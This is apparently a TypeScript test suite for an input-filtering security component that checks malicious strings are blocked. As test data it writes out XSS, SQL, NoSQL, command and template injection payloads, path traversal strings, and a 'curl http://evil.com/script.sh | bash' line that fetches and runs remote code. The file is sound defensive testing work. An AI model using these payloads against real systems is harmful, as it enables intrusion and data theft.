/**
 * OMEGA SENTINEL — Pattern Detection Tests
 * Phase 16.1
 * 
 * INV-SEN-03: Pattern malicieux = BLOCK
 */

import { describe, it, expect, beforeEach } from 'vitest';
import { Sentinel, SentinelStatus, BlockReason } from '../src/sentinel/index.js';

describe('SENTINEL checkPatterns (INV-SEN-03)', () => {
  let sentinel: Sentinel;

  beforeEach(() => {
    sentinel = new Sentinel();
  });

  describe('XSS patterns', () => {
    it('blocks <script> tags', () => {
      const result = sentinel.checkPatterns('<script>alert(1)</script>');
      expect(result.status).toBe(SentinelStatus.BLOCK);
      expect(result.reason).toBe(BlockReason.MALICIOUS_PATTERN);
      expect(result.patternMatches?.[0].category).toBe('XSS');
    });

    it('blocks javascript: protocol', () => {
      const result = sentinel.checkPatterns('javascript:alert(1)');
      expect(result.status).toBe(SentinelStatus.BLOCK);
    });

    it('blocks onclick handlers', () => {
      const result = sentinel.checkPatterns('<div onclick="alert(1)">');
      expect(result.status).toBe(SentinelStatus.BLOCK);
    });

    it('blocks onerror handlers', () => {
      const result = sentinel.checkPatterns('<img onerror="alert(1)">');
      expect(result.status).toBe(SentinelStatus.BLOCK);
    });

    it('blocks iframe tags', () => {
      const result = sentinel.checkPatterns('<iframe src="evil.com">');
      expect(result.status).toBe(SentinelStatus.BLOCK);
    });

    it('blocks eval()', () => {
      const result = sentinel.checkPatterns('eval("malicious")');
      expect(result.status).toBe(SentinelStatus.BLOCK);
    });

    it('blocks document.cookie access', () => {
      const result = sentinel.checkPatterns('document.cookie');
      expect(result.status).toBe(SentinelStatus.BLOCK);
    });

    it('blocks innerHTML assignment', () => {
      const result = sentinel.checkPatterns('element.innerHTML = "<script>"');
      expect(result.status).toBe(SentinelStatus.BLOCK);
    });
  });

  describe('SQL injection patterns', () => {
    it('blocks SELECT FROM', () => {
      const result = sentinel.checkPatterns("SELECT * FROM users");
      expect(result.status).toBe(SentinelStatus.BLOCK);
      expect(result.patternMatches?.[0].category).toBe('SQL_INJECTION');
    });

    it('blocks OR injection', () => {
      const result = sentinel.checkPatterns("' OR '1'='1");
      expect(result.status).toBe(SentinelStatus.BLOCK);
    });

    it('blocks DROP TABLE', () => {
      const result = sentinel.checkPatterns("; DROP TABLE users");
      expect(result.status).toBe(SentinelStatus.BLOCK);
    });

    it('blocks UNION SELECT', () => {
      const result = sentinel.checkPatterns("UNION SELECT password FROM users");
      expect(result.status).toBe(SentinelStatus.BLOCK);
    });

    it('blocks SQL comments', () => {
      const result = sentinel.checkPatterns("admin'--");
      expect(result.status).toBe(SentinelStatus.BLOCK);
    });

    it('blocks SLEEP injection', () => {
      const result = sentinel.checkPatterns("SLEEP(5)");
      expect(result.status).toBe(SentinelStatus.BLOCK);
    });
  });

  describe('command injection patterns', () => {
    it('blocks shell command execution', () => {
      const result = sentinel.checkPatterns('; cat /etc/passwd');
      expect(result.status).toBe(SentinelStatus.BLOCK);
      expect(result.patternMatches?.[0].category).toBe('COMMAND_INJECTION');
    });

    it('blocks $() command substitution', () => {
      const result = sentinel.checkPatterns('$(whoami)');
      expect(result.status).toBe(SentinelStatus.BLOCK);
    });

    it('blocks backtick command execution', () => {
      const result = sentinel.checkPatterns('`ls -la`');
      expect(result.status).toBe(SentinelStatus.BLOCK);
    });

    it('blocks path traversal', () => {
      const result = sentinel.checkPatterns('../../../etc/passwd');
      expect(result.status).toBe(SentinelStatus.BLOCK);
    });

    it('blocks encoded path traversal', () => {
      const result = sentinel.checkPatterns('%2e%2e%2f%2e%2e%2f');
      expect(result.status).toBe(SentinelStatus.BLOCK);
    });

    it('blocks curl piped to shell', () => {
      const result = sentinel.checkPatterns('curl http://evil.com/script.sh | bash');
      expect(result.status).toBe(SentinelStatus.BLOCK);
    });
  });

  describe('NoSQL injection patterns', () => {
    it('blocks $where operator', () => {
      const result = sentinel.checkPatterns('{"$where": "this.password"}');
      expect(result.status).toBe(SentinelStatus.BLOCK);
    });

    it('blocks $ne operator', () => {
      const result = sentinel.checkPatterns('{"password": {"$ne": ""}}');
      expect(result.status).toBe(SentinelStatus.BLOCK);
    });

    it('blocks $or operator', () => {
      const result = sentinel.checkPatterns('{"$or": [{"admin": true}]}');
      expect(result.status).toBe(SentinelStatus.BLOCK);
    });
  });

  describe('template injection patterns', () => {
    it('blocks Mustache templates', () => {
      const result = sentinel.checkPatterns('{{constructor.constructor("return this")()}}');
      expect(result.status).toBe(SentinelStatus.BLOCK);
    });

    it('blocks Jinja templates', () => {
      const result = sentinel.checkPatterns('{% import os %}{{ os.popen("id").read() }}');
      expect(result.status).toBe(SentinelStatus.BLOCK);
    });
  });

  describe('prototype pollution patterns', () => {
    it('blocks __proto__', () => {
      const result = sentinel.checkPatterns('{"__proto__": {"admin": true}}');
      expect(result.status).toBe(SentinelStatus.BLOCK);
    });

    it('blocks constructor.prototype', () => {
      const result = sentinel.checkPatterns('constructor.prototype.isAdmin = true');
      expect(result.status).toBe(SentinelStatus.BLOCK);
    });
  });

  describe('nested objects', () => {
    it('detects patterns in nested string values', () => {
      const input = {
        user: {
          name: 'John',
          bio: '<script>alert("xss")</script>',
        },
      };
      const result = sentinel.checkPatterns(input);
      expect(result.status).toBe(SentinelStatus.BLOCK);
      expect(result.patternMatches?.[0].path).toBe('user.bio');
    });

    it('detects patterns in arrays', () => {
      const input = ['safe', 'also safe', '<script>bad</script>'];
      const result = sentinel.checkPatterns(input);
      expect(result.status).toBe(SentinelStatus.BLOCK);
      expect(result.patternMatches?.[0].path).toBe('[2]');
    });
  });

  describe('safe inputs', () => {
    it('passes normal text', () => {
      const result = sentinel.checkPatterns('Hello, this is normal text.');
      expect(result.status).toBe(SentinelStatus.PASS);
    });

    it('passes numbers', () => {
      const result = sentinel.checkPatterns(12345);
      expect(result.status).toBe(SentinelStatus.PASS);
    });

    it('passes boolean', () => {
      const result = sentinel.checkPatterns(true);
      expect(result.status).toBe(SentinelStatus.PASS);
    });

    it('passes null', () => {
      const result = sentinel.checkPatterns(null);
      expect(result.status).toBe(SentinelStatus.PASS);
    });

    it('passes safe HTML', () => {
      const result = sentinel.checkPatterns('<p>This is <strong>safe</strong> HTML.</p>');
      expect(result.status).toBe(SentinelStatus.PASS);
    });

    it('passes code samples when no execution context', () => {
      // This is just the word "select" without SQL context
      const result = sentinel.checkPatterns('Please select an option');
      expect(result.status).toBe(SentinelStatus.PASS);
    });
  });

  describe('configuration toggles', () => {
    it('can disable XSS checking', () => {
      const sentinel = new Sentinel({ enableXssCheck: false });
      const result = sentinel.checkPatterns('<script>alert(1)</script>');
      // Should not detect as XSS is disabled
      const hasXssMatch = result.patternMatches?.some(m => m.category === 'XSS');
      expect(hasXssMatch).toBeFalsy();
    });

    it('can disable SQL injection checking', () => {
      const sentinel = new Sentinel({ enableSqlCheck: false });
      const result = sentinel.checkPatterns("SELECT * FROM users");
      const hasSqlMatch = result.patternMatches?.some(m => m.category === 'SQL_INJECTION');
      expect(hasSqlMatch).toBeFalsy();
    });
  });
});
